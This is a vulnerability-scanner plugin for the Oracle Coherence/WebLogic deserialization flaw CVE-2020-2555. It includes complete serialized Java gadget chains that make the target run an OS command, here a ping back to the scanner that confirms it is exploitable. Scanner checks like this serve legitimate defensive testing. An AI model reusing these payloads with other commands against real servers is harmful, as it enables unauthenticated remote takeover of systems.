include("compat.inc");

if (description)
{
  script_id(51799216);
  script_version("1.9");
  script_cvs_date("Date: 2020/01/15 19:07:47");

  script_cve_id("CVE-2020-2555");

  script_name(english:"Oracle Fusion Middleware Coherence && WebLogic Remote Code Execution");
  script_summary(english:"Sends an HTTP POST request and ping response");

  script_set_attribute(attribute:"synopsis", value:
"The remote Oracle Coherence or WebLogic server is affected by a remote code
execution vulnerability.");
  script_set_attribute(attribute:"description", value:"Vulnerability in the Oracle Coherence product of Oracle Fusion Middleware (component: Caching,CacheStore,Invocation). Supported versions that are affected are 3.7.1.17, 12.1.3.0.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via T3 to compromise Oracle Coherence. Successful attacks of this vulnerability can result in takeover of Oracle Coherence. ");
  # http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html#AppendixFMW
  script_set_attribute(attribute:"solution", value:
"Apply the appropriate patch according to the Oracle
Critical Patch Update advisory : https://www.oracle.com/security-alerts/cpujan2020.html .");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"risk_factor", value:"High");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:oracle:weblogic_server");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"Copyright (C) 2004-2020 WebRAY");

  script_dependencies("weblogic_detect.nasl","t3_detect.nasl","weblogic_www_detect.nasl");
  script_require_ports("Services/t3", 7001);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

os = get_kb_item_or_exit("Host/OS");
port = get_http_port(default:7001, embedded:FALSE);
port = get_service(svc:'t3', default:7001, exit_on_fail:TRUE);
version = get_kb_item("www/weblogic/" + port + "/version");

ping_cmd = '';
laddress = compat::this_host();
pattern = hexstr(rand_str(length:8));
if("windows" >< tolower(os))
{
    ping_cmd = "ping -n 10 "+ laddress;
}
else{
    ping_cmd = "ping -c 10 -p "+ pattern + " " + laddress;
}

cmdlen = strlen(ping_cmd);

soc = open_sock_tcp(port);
if (!soc)
{
  audit(AUDIT_SOCK_FAIL, port, appname);
}

if (version =~ "^12\.1\.3\."){
	# 12.1.3.*
	serObj = hex2raw(s:"ACED00057372002E6A617661782E6D616E6167656D656E742E42616441747472696275746556616C7565457870457863657074696F6ED4E7DAAB632D46400200014C000376616C7400124C6A6176612F6C616E672F4F626A6563743B787200136A6176612E6C616E672E457863657074696F6ED0FD1F3E1A3B1CC4020000787200136A6176612E6C616E672E5468726F7761626C65D5C635273977B8CB0300044C000563617573657400154C6A6176612F6C616E672F5468726F7761626C653B4C000D64657461696C4D6573736167657400124C6A6176612F6C616E672F537472696E673B5B000A737461636B547261636574001E5B4C6A6176612F6C616E672F537461636B5472616365456C656D656E743B4C001473757070726573736564457863657074696F6E737400104C6A6176612F7574696C2F4C6973743B787071007E0008707572001E5B4C6A6176612E6C616E672E537461636B5472616365456C656D656E743B02462A3C3CFD22390200007870000000017372001B6A6176612E6C616E672E537461636B5472616365456C656D656E746109C59A2636DD8502000449000A6C696E654E756D6265724C000E6465636C6172696E67436C61737371007E00054C000866696C654E616D6571007E00054C000A6D6574686F644E616D6571007E000578700000002E7400176578702E4356455F323032305F323535355F31323231327400184356455F323032305F323535355F31323231322E6A6176617400046D61696E737200266A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C654C697374FC0F2531B5EC8E100200014C00046C69737471007E00077872002C6A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C65436F6C6C656374696F6E19420080CB5EF71E0200014C0001637400164C6A6176612F7574696C2F436F6C6C656374696F6E3B7870737200136A6176612E7574696C2E41727261794C6973747881D21D99C7619D03000149000473697A657870000000007704000000007871007E00157873720024636F6D2E74616E676F736F6C2E7574696C2E66696C7465722E4C696D697446696C74657299022596D7B4595302000649000B6D5F635061676553697A654900076D5F6E506167654C000C6D5F636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B4C00086D5F66696C74657274001A4C636F6D2F74616E676F736F6C2F7574696C2F46696C7465723B4C000F6D5F6F416E63686F72426F74746F6D71007E00014C000C6D5F6F416E63686F72546F7071007E0001787000000000000000007372002C636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E436861696E6564457874726163746F72889F81B0945D5B7F02000078720036636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374436F6D706F73697465457874726163746F72086B3D8C05690F440200015B000C6D5F61457874726163746F727400235B4C636F6D2F74616E676F736F6C2F7574696C2F56616C7565457874726163746F723B7872002D636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374457874726163746F72658195303E7238210200014900096D5F6E546172676574787000000000757200235B4C636F6D2E74616E676F736F6C2E7574696C2E56616C7565457874726163746F723B2246204735C4A0FE0200007870000000037372002F636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E5265666C656374696F6E457874726163746F72EE7AE995C02FB4A20200025B00096D5F616F506172616D7400135B4C6A6176612F6C616E672F4F626A6563743B4C00096D5F734D6574686F6471007E00057871007E001D00000001757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647371007E0021000000017571007E002400000002707571007E002400000000740006696E766F6B657371007E0021000000017571007E00240000000174");
	serObj += hex2raw(s:"00")+raw_string(cmdlen) + raw_string(ping_cmd);
	serObj += hex2raw(s:"740004657865637070767200116A6176612E6C616E672E52756E74696D6500000000000000000000007870");

}
if (version =~ "^12\.2\.1\.2\." || version =~ "^12\.2\.1\.3\."){
	# 12.2.1.2   12.2.1.3
	serObj = hex2raw(s:"ACED00057372002E6A617661782E6D616E6167656D656E742E42616441747472696275746556616C7565457870457863657074696F6ED4E7DAAB632D46400200014C000376616C7400124C6A6176612F6C616E672F4F626A6563743B787200136A6176612E6C616E672E457863657074696F6ED0FD1F3E1A3B1CC4020000787200136A6176612E6C616E672E5468726F7761626C65D5C635273977B8CB0300044C000563617573657400154C6A6176612F6C616E672F5468726F7761626C653B4C000D64657461696C4D6573736167657400124C6A6176612F6C616E672F537472696E673B5B000A737461636B547261636574001E5B4C6A6176612F6C616E672F537461636B5472616365456C656D656E743B4C001473757070726573736564457863657074696F6E737400104C6A6176612F7574696C2F4C6973743B787071007E0008707572001E5B4C6A6176612E6C616E672E537461636B5472616365456C656D656E743B02462A3C3CFD22390200007870000000017372001B6A6176612E6C616E672E537461636B5472616365456C656D656E746109C59A2636DD8502000449000A6C696E654E756D6265724C000E6465636C6172696E67436C61737371007E00054C000866696C654E616D6571007E00054C000A6D6574686F644E616D6571007E000578700000002E7400176578702E4356455F323032305F323535355F31323231327400184356455F323032305F323535355F31323231322E6A6176617400046D61696E737200266A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C654C697374FC0F2531B5EC8E100200014C00046C69737471007E00077872002C6A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C65436F6C6C656374696F6E19420080CB5EF71E0200014C0001637400164C6A6176612F7574696C2F436F6C6C656374696F6E3B7870737200136A6176612E7574696C2E41727261794C6973747881D21D99C7619D03000149000473697A657870000000007704000000007871007E00157873720024636F6D2E74616E676F736F6C2E7574696C2E66696C7465722E4C696D697446696C746572AB2901B976C4E27102000649000B6D5F635061676553697A654900076D5F6E506167654C000C6D5F636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B4C00086D5F66696C74657274001A4C636F6D2F74616E676F736F6C2F7574696C2F46696C7465723B4C000F6D5F6F416E63686F72426F74746F6D71007E00014C000C6D5F6F416E63686F72546F7071007E000178720034636F6D2E74616E676F736F6C2E7574696C2E66696C7465722E416273747261637451756572795265636F7264657246696C746572F3B98201F680EB90020000787000000000000000007372002C636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E436861696E6564457874726163746F7206EE10433A4CC4B402000078720036636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374436F6D706F73697465457874726163746F72086B3D8C05690F440200015B000C6D5F61457874726163746F727400235B4C636F6D2F74616E676F736F6C2F7574696C2F56616C7565457874726163746F723B7872002D636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374457874726163746F72752289AD4D4601380200014900096D5F6E546172676574787000000000757200235B4C636F6D2E74616E676F736F6C2E7574696C2E56616C7565457874726163746F723B2246204735C4A0FE0200007870000000037372002F636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E5265666C656374696F6E457874726163746F7287973791B26429DD0200035B00096D5F616F506172616D7400135B4C6A6176612F6C616E672F4F626A6563743B4C00116D5F657874726163746F7243616368656471007E00014C00096D5F734D6574686F6471007E00057871007E001E00000001757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A99020000787000000000707400096765744D6574686F647371007E0022000000017571007E002500000002707571007E00250000000070740006696E766F6B657371007E0022000000017571007E00250000000174");
	serObj += hex2raw(s:"00")+raw_string(cmdlen) + raw_string(ping_cmd);
	serObj += hex2raw(s:"70740004657865637070767200116A6176612E6C616E672E52756E74696D6500000000000000000000007870");

}
if (version =~ "^12\.2\.1\.4\."){
	# 12.2.1.4
	serObj = hex2raw(s:"ACED00057372002E6A617661782E6D616E6167656D656E742E42616441747472696275746556616C7565457870457863657074696F6ED4E7DAAB632D46400200014C000376616C7400124C6A6176612F6C616E672F4F626A6563743B787200136A6176612E6C616E672E457863657074696F6ED0FD1F3E1A3B1CC4020000787200136A6176612E6C616E672E5468726F7761626C65D5C635273977B8CB0300044C000563617573657400154C6A6176612F6C616E672F5468726F7761626C653B4C000D64657461696C4D6573736167657400124C6A6176612F6C616E672F537472696E673B5B000A737461636B547261636574001E5B4C6A6176612F6C616E672F537461636B5472616365456C656D656E743B4C001473757070726573736564457863657074696F6E737400104C6A6176612F7574696C2F4C6973743B787071007E0008707572001E5B4C6A6176612E6C616E672E537461636B5472616365456C656D656E743B02462A3C3CFD22390200007870000000017372001B6A6176612E6C616E672E537461636B5472616365456C656D656E746109C59A2636DD8502000449000A6C696E654E756D6265724C000E6465636C6172696E67436C61737371007E00054C000866696C654E616D6571007E00054C000A6D6574686F644E616D6571007E000578700000002E7400176578702E4356455F323032305F323535355F31323231327400184356455F323032305F323535355F31323231322E6A6176617400046D61696E737200266A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C654C697374FC0F2531B5EC8E100200014C00046C69737471007E00077872002C6A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C65436F6C6C656374696F6E19420080CB5EF71E0200014C0001637400164C6A6176612F7574696C2F436F6C6C656374696F6E3B7870737200136A6176612E7574696C2E41727261794C6973747881D21D99C7619D03000149000473697A657870000000007704000000007871007E00157873720024636F6D2E74616E676F736F6C2E7574696C2E66696C7465722E4C696D697446696C746572954E4590BE89865F02000649000B6D5F635061676553697A654900076D5F6E506167654C000C6D5F636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B4C00086D5F66696C74657274001A4C636F6D2F74616E676F736F6C2F7574696C2F46696C7465723B4C000F6D5F6F416E63686F72426F74746F6D71007E00014C000C6D5F6F416E63686F72546F7071007E000178720034636F6D2E74616E676F736F6C2E7574696C2E66696C7465722E416273747261637451756572795265636F7264657246696C746572F3B98201F680EB90020000787000000000000000007372002C636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E436861696E6564457874726163746F72435B250B72F63DB502000078720036636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374436F6D706F73697465457874726163746F72086B3D8C05690F440200015B000C6D5F61457874726163746F727400235B4C636F6D2F74616E676F736F6C2F7574696C2F56616C7565457874726163746F723B7872002D636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374457874726163746F729B1BE18ED70100E50200014900096D5F6E546172676574787000000001757200235B4C636F6D2E74616E676F736F6C2E7574696C2E56616C7565457874726163746F723B2246204735C4A0FE0200007870000000037372002F636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E5265666C656374696F6E457874726163746F721F62F564B951B6140200025B00096D5F616F506172616D7400135B4C6A6176612F6C616E672F4F626A6563743B4C00096D5F734D6574686F6471007E00057871007E001E00000001757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647371007E0022000000017571007E002500000002707571007E002500000000740006696E766F6B657371007E0022000000017571007E00250000000174");
	serObj += hex2raw(s:"00")+raw_string(cmdlen) + raw_string(ping_cmd);
	serObj += hex2raw(s:"740004657865637070767200116A6176612E6C616E672E52756E74696D6500000000000000000000007870");
}


payload=hex2raw(s:"000009f3016501ffffffffffffffff000000710000ea6000000018432ec6a2a63985b5af7d63e64383f42a6d92c9e9af0f9472027973720078720178720278700000000c00000002000000000000000000000001007070707070700000000c00000002000000000000000000000001007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200094900056d616a6f724900056d696e6f7249000b706174636855706461746549000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000");
payload=payload+serObj;
payload=payload+hex2raw(s:"fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200074900056d616a6f724900056d696e6f7249000b706174636855706461746549000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200094900056d616a6f724900056d696e6f7249000b706174636855706461746549000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870774621000000000000000000093132372e302e312e31000b75732d6c2d627265656e73a53caff10000000700001b59ffffffffffffffffffffffffffffffffffffffffffffffff0078fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870771d018140128134bf427600093132372e302e312e31a53caff1000000000078");


headers='t3 12.2.1'+'\n'+'AS:255'+'\n'+
		'HL:19'+'\n'+
		'MS:10000000'+'\n'+
		'PU:t3://us-l-breens:7001'+'\n\n';



filter = "icmp and icmp[0] = 8 and src host " + get_host_ip();
response = send_capture(socket:soc, data:headers, pcap_filter:filter);
sleep(1);
response2 = send_capture(socket:soc, data:payload, pcap_filter:filter);

icmp = tolower(hexstr(get_icmp_element(icmp:response2, element:"data")));
close(soc);


if("windows" >< tolower(os) && !isnull(icmp)){
	report =
		'\nScanner was able to exploit a Weblogic deserialization vulnerability by' +
		'\nsending a crafted Java object.' +
		'\n';
	set_kb_item(name:"CVE_2020_2555_local",value: TRUE);
	security_hole(port:port, extra:report);
}
if (pattern >< icmp && !isnull(icmp)){
	report =
		'\nScanner was able to exploit a Linux Weblogic deserialization vulnerability by' +
		'\nsending a crafted Java object.' +
		'\n';
	set_kb_item(name:"CVE_2020_2555_local",value: TRUE);
	security_hole(port:port, extra:report);
}
set_kb_item(name:"CVE_2020_2555_local",value: FALSE);
set_kb_item(name:"CVE_2020_2555_local_port",value: port);
set_kb_item(name:"CVE_2020_2555_local_os",value: os);
exit(0);
